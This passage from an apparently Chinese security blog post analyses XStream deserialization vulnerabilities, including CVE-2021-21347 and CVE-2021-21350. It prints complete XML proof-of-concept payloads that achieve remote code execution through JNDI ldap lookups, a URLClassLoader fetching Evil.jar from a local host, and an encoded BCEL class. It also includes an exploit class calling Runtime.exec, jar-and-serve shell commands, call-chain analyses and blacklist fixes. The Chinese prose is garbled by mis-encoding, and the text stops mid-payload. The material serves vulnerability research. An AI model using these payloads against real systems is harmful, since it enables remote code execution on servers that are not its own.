class="tag">&lt;/<span class="name">className</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">methodName</span>&gt;</span>doLookup<span class="tag">&lt;/<span class="name">methodName</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">args</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">string</span>&gt;</span>ldap://localhost:1099/CallRemoteMethod<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;/<span class="name">args</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">sun.swing.SwingLazyValue</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;/<span class="name">hashtable</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">javax.swing.UIDefaults</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">default</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">defaultLocale</span> <span class="attr">reference</span>=<span class="string">&#x27;../../../../../../../javax.swing.UIDefaults/default/defaultLocale&#x27;</span>/&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">resourceCache</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">default</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;/<span class="name">javax.swing.UIDefaults</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">javax.swing.UIDefaults</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">tables</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">default</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">javax.swing.MultiUIDefaults</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">javax.naming.ldap.Rdn_-RdnEntry</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">javax.naming.ldap.Rdn_-RdnEntry</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">type</span>&gt;</span>ysomap<span class="tag">&lt;/<span class="name">type</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.org.apache.xpath.internal.objects.XString&#x27;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">m__obj</span> <span class="attr">class</span>=<span class="string">&#x27;string&#x27;</span>&gt;</span>test<span class="tag">&lt;/<span class="name">m__obj</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">javax.naming.ldap.Rdn_-RdnEntry</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">sorted-set</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="åˆ†æ-2"><a href="#åˆ†æ-2" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p>è¿™ä¸ªæ˜¯wh1t3p1gå¸ˆå‚…ä¸Šäº¤çš„ï¼Œå®é™…ä¸ºysomapé‡Œçš„LazyValueï¼Œå¸ˆå‚…ç»™çš„è°ƒç”¨é“¾åˆ†æ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">javax.naming.ldap.Rdn$RdnEntry.compareTo</span><br><span class="line">    com.sun.org.apache.xpath.internal.objects.XString.equal</span><br><span class="line">        javax.swing.MultiUIDefaults.toString</span><br><span class="line">            UIDefaults.get</span><br><span class="line">                UIDefaults.getFromHashTable</span><br><span class="line">                    UIDefaults$LazyValue.createValue</span><br><span class="line">                    SwingLazyValue.createValue</span><br><span class="line">                        javax.naming.InitialContext.doLookup()</span><br></pre></td></tr></table></figure><p>æ³¨æ„å®˜ç½‘pocé‡Œé¢çš„æ˜¯<arg>æ ‡ç­¾ï¼Œä¼°è®¡æ˜¯jdkç‰ˆæœ¬åŸå› </p><h3 id="é»‘åå•ï¼š-3"><a href="#é»‘åå•ï¼š-3" class="headerlink" title="é»‘åå•ï¼š"></a>é»‘åå•ï¼š</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sun.swing.SwingLazyValue</span><br></pre></td></tr></table></figure><h2 id="CVE-2021-21347"><a href="#CVE-2021-21347" class="headerlink" title="CVE-2021-21347"></a>CVE-2021-21347</h2><p>author: threedr3am</p><h3 id="POC-3"><a href="#POC-3" class="headerlink" title="POC"></a>POC</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">java.util.PriorityQueue</span> <span class="attr">serialization</span>=<span class="string">&#x27;custom&#x27;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">unserializable-parents</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">java.util.PriorityQueue</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">default</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">size</span>&gt;</span>2<span class="tag">&lt;/<span class="name">size</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">comparator</span> <span class="attr">class</span>=<span class="string">&#x27;javafx.collections.ObservableList$1&#x27;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">default</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">int</span>&gt;</span>3<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">dataHandler</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dataSource</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource&#x27;</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">contentType</span>&gt;</span>text/plain<span class="tag">&lt;/<span class="name">contentType</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">is</span> <span class="attr">class</span>=<span class="string">&#x27;java.io.SequenceInputStream&#x27;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">e</span> <span class="attr">class</span>=<span class="string">&#x27;javax.swing.MultiUIDefaults$MultiUIDefaultsEnumerator&#x27;</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">iterator</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.tools.javac.processing.JavacProcessingEnvironment$NameProcessIterator&#x27;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">names</span> <span class="attr">class</span>=<span class="string">&#x27;java.util.AbstractList$Itr&#x27;</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">cursor</span>&gt;</span>0<span class="tag">&lt;/<span class="name">cursor</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">lastRet</span>&gt;</span>-1<span class="tag">&lt;/<span class="name">lastRet</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">expectedModCount</span>&gt;</span>0<span class="tag">&lt;/<span class="name">expectedModCount</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">outer-class</span> <span class="attr">class</span>=<span class="string">&#x27;java.util.Arrays$ArrayList&#x27;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">&#x27;string-array&#x27;</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">string</span>&gt;</span>Evil<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;/<span class="name">outer-class</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">names</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">processorCL</span> <span class="attr">class</span>=<span class="string">&#x27;java.net.URLClassLoader&#x27;</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">ucp</span> <span class="attr">class</span>=<span class="string">&#x27;sun.misc.URLClassPath&#x27;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">urls</span> <span class="attr">serialization</span>=<span class="string">&#x27;custom&#x27;</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">unserializable-parents</span>/&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">vector</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">default</span>&gt;</span></span><br><span class="line">                          <span class="tag">&lt;<span class="name">capacityIncrement</span>&gt;</span>0<span class="tag">&lt;/<span class="name">capacityIncrement</span>&gt;</span></span><br><span class="line">                          <span class="tag">&lt;<span class="name">elementCount</span>&gt;</span>1<span class="tag">&lt;/<span class="name">elementCount</span>&gt;</span></span><br><span class="line">                          <span class="tag">&lt;<span class="name">elementData</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">url</span>&gt;</span>http://127.0.0.1:80/Evil.jar<span class="tag">&lt;/<span class="name">url</span>&gt;</span></span><br><span class="line">                          <span class="tag">&lt;/<span class="name">elementData</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">default</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;/<span class="name">vector</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">urls</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">path</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">url</span>&gt;</span>http://127.0.0.1:80/Evil.jar<span class="tag">&lt;/<span class="name">url</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">path</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">loaders</span>/&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">lmap</span>/&gt;</span></span><br><span class="line">                  <span class="tag">&lt;/<span class="name">ucp</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">package2certs</span> <span class="attr">class</span>=<span class="string">&#x27;concurrent-hash-map&#x27;</span>/&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">classes</span>/&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">defaultDomain</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">classloader</span> <span class="attr">class</span>=<span class="string">&#x27;java.net.URLClassLoader&#x27;</span> <span class="attr">reference</span>=<span class="string">&#x27;../..&#x27;</span>/&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">principals</span>/&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">hasAllPerm</span>&gt;</span>false<span class="tag">&lt;/<span class="name">hasAllPerm</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">staticPermissions</span>&gt;</span>false<span class="tag">&lt;/<span class="name">staticPermissions</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">key</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">outer-class</span> <span class="attr">reference</span>=<span class="string">&#x27;../..&#x27;</span>/&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">key</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;/<span class="name">defaultDomain</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">initialized</span>&gt;</span>true<span class="tag">&lt;/<span class="name">initialized</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">pdcache</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">processorCL</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;/<span class="name">iterator</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">type</span>&gt;</span>KEYS<span class="tag">&lt;/<span class="name">type</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">e</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">in</span> <span class="attr">class</span>=<span class="string">&#x27;java.io.ByteArrayInputStream&#x27;</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">buf</span>&gt;</span><span class="tag">&lt;/<span class="name">buf</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">pos</span>&gt;</span>-2147483648<span class="tag">&lt;/<span class="name">pos</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">mark</span>&gt;</span>0<span class="tag">&lt;/<span class="name">mark</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">count</span>&gt;</span>0<span class="tag">&lt;/<span class="name">count</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">in</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">is</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">consumed</span>&gt;</span>false<span class="tag">&lt;/<span class="name">consumed</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dataSource</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">transferFlavors</span>/&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">dataHandler</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">dataLen</span>&gt;</span>0<span class="tag">&lt;/<span class="name">dataLen</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data</span> <span class="attr">reference</span>=<span class="string">&#x27;../com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&#x27;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">java.util.PriorityQueue</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">java.util.PriorityQueue</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="åˆ†æ-3"><a href="#åˆ†æ-3" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p>è¿™ä¸ªPOCçš„RCEè§¦å‘ç‚¹æ˜¯com.sun.tools.javac.processing.JavacProcessingEnvironment$NameProcessIterator</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">ClassLoader processorCL;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">hasNext</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.nextProc != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="keyword">this</span>.names.hasNext()) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        String var1 = (String)<span class="keyword">this</span>.names.next();</span><br><span class="line"></span><br><span class="line">        Processor var2;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                var2 = (Processor)((Processor)<span class="keyword">this</span>.processorCL.loadClass(var1).newInstance());</span><br><span class="line">                ...</span><br></pre></td></tr></table></figure><p>æ„é€ ä¸€ä¸ªæœ‰evil codeçš„staticä»£ç å—ç±»ï¼Œæ‰“åŒ…jar</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ExploitStaticCalc</span> </span>&#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;open -a calculator.app&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">jar cvf Exploit.jar ExploitStaticCalc.class</span><br><span class="line">python -m SimpleHTTPServer 8000</span><br></pre></td></tr></table></figure><p>å‚è€ƒã€2ã€‘åŸæ–‡ä¸­æœ‰æåˆ°å‡ ç‚¹æœ‰æ„æ€çš„ï¼Œè¿™é‡Œå°±ä¸å¤è¿°äº†</p><ol><li>XStream çš„outer-class</li><li>åŒ¿åå†…éƒ¨ç±»</li><li>ä¸åŒjavaç‰ˆæœ¬ä¸‹ObservableListã€ProtectionDomainçš„ä¸åŒå¯¼è‡´POCè¦åšç›¸åº”çš„ä¿®æ”¹</li></ol><p>ä½†æ˜¯åœ¨æµ‹è¯•çš„æ—¶å€™ï¼Œ8u60ã€8u172éƒ½å¤±è´¥ï¼Œ8u231æˆåŠŸã€‚å¤±è´¥çš„æŠ¥é”™äº‹com.sun.tools.javac.processing.AnnotationProcessingErrorï¼Œåˆ¤æ–­åº”è¯¥æ˜¯processorCL ç»“æ„é—®é¢˜ï¼Œå¯¹æ¯”8u231è·Ÿè¸ªåˆ°java.lang.ClassLoader#defineClass1ï¼Œå‚æ•°åŸºæœ¬ä¸€æ ·ï¼Œä½†æ˜¯loadClasså¤±è´¥ï¼Œæœªæ’æŸ¥åˆ°åŸå› ã€‚</p><p>å¤ªèœé¸¡äº†ã€‚ã€‚ã€‚</p><h3 id="é»‘åå•ï¼š-4"><a href="#é»‘åå•ï¼š-4" class="headerlink" title="é»‘åå•ï¼š"></a>é»‘åå•ï¼š</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">om.sun.tools.javac.processing.JavacProcessingEnvironment$NameProcessIterator</span><br><span class="line">denyTypeHierarchyDynamically(<span class="string">&quot;javax.activation.DataSource&quot;</span>);</span><br></pre></td></tr></table></figure><h2 id="CVE-2021-21350"><a href="#CVE-2021-21350" class="headerlink" title="CVE-2021-21350"></a>CVE-2021-21350</h2><p>author: thread3am</p><h3 id="POC-4"><a href="#POC-4" class="headerlink" title="POC"></a>POC</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">java.util.PriorityQueue</span> <span class="attr">serialization</span>=<span class="string">&#x27;custom&#x27;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">unserializable-parents</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">java.util.PriorityQueue</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">default</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">size</span>&gt;</span>2<span class="tag">&lt;/<span class="name">size</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">comparator</span> <span class="attr">class</span>=<span class="string">&#x27;javafx.collections.ObservableList$1&#x27;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">default</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">int</span>&gt;</span>3<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">dataHandler</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dataSource</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource&#x27;</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">contentType</span>&gt;</span>text/plain<span class="tag">&lt;/<span class="name">contentType</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">is</span> <span class="attr">class</span>=<span class="string">&#x27;java.io.SequenceInputStream&#x27;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">e</span> <span class="attr">class</span>=<span class="string">&#x27;javax.swing.MultiUIDefaults$MultiUIDefaultsEnumerator&#x27;</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">iterator</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.tools.javac.processing.JavacProcessingEnvironment$NameProcessIterator&#x27;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">names</span> <span class="attr">class</span>=<span class="string">&#x27;java.util.AbstractList$Itr&#x27;</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">cursor</span>&gt;</span>0<span class="tag">&lt;/<span class="name">cursor</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">lastRet</span>&gt;</span>-1<span class="tag">&lt;/<span class="name">lastRet</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">expectedModCount</span>&gt;</span>0<span class="tag">&lt;/<span class="name">expectedModCount</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">outer-class</span> <span class="attr">class</span>=<span class="string">&#x27;java.util.Arrays$ArrayList&#x27;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">&#x27;string-array&#x27;</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">string</span>&gt;</span>$$BCEL$$$l$8b$I$A$A$A$A$A$A$AeQ$ddN$c20$Y$3d$85$c9$60$O$e5G$fcW$f0J0Qn$bc$c3$Y$T$83$89$c9$oF$M$5e$97$d9$60$c9X$c9$d6$R$5e$cb$h5$5e$f8$A$3e$94$f1$x$g$q$b1MwrN$cf$f9$be$b6$fb$fcz$ff$Ap$8a$aa$83$MJ$O$caX$cb$a2bp$dd$c6$86$8dM$86$cc$99$M$a5$3egH$d7$h$3d$G$ebR$3d$K$86UO$86$e2$s$Z$f5Et$cf$fb$B$v$rO$f9$3c$e8$f1H$g$fe$xZ$faI$c6T$c3kOd$d0bp$daS_$8c$b5Talc$8bxW$r$91$_$ae$a41$e7$8c$e9d$c8$t$dc$85$8d$ac$8dm$X$3b$d8$a5$d2j$y$c2$da1$afQ$D$3f$J$b8V$91$8b$3d$ecS$7d$Ta$u$98P3$e0$e1$a0$d9$e9$P$85$af$Z$ca3I$aa$e6ug$de$93$a1$f8g$bcKB$zG$d4$d6$Z$I$3d$t$95z$c3$fb$e7$a1$83$5bb$w$7c$86$c3$fa$c2nWG2$i$b4$W$D$b7$91$f2E$i$b7p$80$rzQ3$YM$ba$NR$c8$R$bb$md$84$xG$af$60oH$95$d2$_$b0$k$9eII$c11$3a$d2$f4$cd$c2$ow$9e$94eb$eeO$820$3fC$d0$$$fd$BZ$85Y$ae$f8$N$93$85$cf$5c$c7$B$A$A<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;/<span class="name">outer-class</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">names</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">processorCL</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.org.apache.bcel.internal.util.ClassLoader&#x27;</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">parent</span> <span class="attr">class</span>=<span class="string">&#x27;sun.misc.Launcher$ExtClassLoader&#x27;</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;/<span class="name">parent</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">package2certs</span> <span class="attr">class</span>=<span class="string">&#x27;hashtable&#x27;</span>/&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">classes</span> <span class="attr">defined-in</span>=<span class="string">&#x27;java.lang.ClassLoader&#x27;</span>/&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">defaultDomain</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">classloader</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.org.apache.bcel.internal.util.ClassLoader&#x27;</span> <span class="attr">reference</span>=<span class="string">&#x27;../..&#x27;</span>/&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">principals</span>/&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">hasAllPerm</span>&gt;</span>false<span class="tag">&lt;/<span class="name">hasAllPerm</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">staticPermissions</span>&gt;</span>false<span class="tag">&lt;/<span class="name">staticPermissions</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">key</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">outer-class</span> <span class="attr">reference</span>=<span class="string">&#x27;../..&#x27;</span>/&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">key</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;/<span class="name">defaultDomain</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">packages</span>/&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">nativeLibraries</span>/&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span 